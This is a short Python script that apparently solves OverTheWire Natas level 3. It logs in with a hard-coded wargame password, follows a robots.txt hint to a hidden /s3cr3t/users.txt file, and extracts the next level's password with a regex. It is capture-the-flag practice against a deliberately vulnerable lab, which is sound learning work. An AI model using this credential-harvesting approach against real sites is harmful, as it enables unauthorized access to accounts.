#!/usr/bin/env python

#using requests module for python, not sure if I will need to install anything for this?
import requests
import re

username = 'natas3'
password = 'G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q'
#url = 'http://%s.natas.labs.overthewire.org/' % username
#so the output claiming google won't find this is a nod to robots.text, which is a webcrawler basically
#url = 'http://%s.natas.labs.overthewire.org/robots.txt' % username
#checking robots.txt, which says for any user disallow /s3cr3t/
#url = 'http://%s.natas.labs.overthewire.org/s3cr3t/' % username
#now I see another users.txt
url = 'http://%s.natas.labs.overthewire.org/s3cr3t/users.txt' % username


print(url) #make sure the URL works fine

response = requests.get(url, auth = (username, password))
content = response.text
######################
print(content)


print(re.findall('natas4:(.*)', content))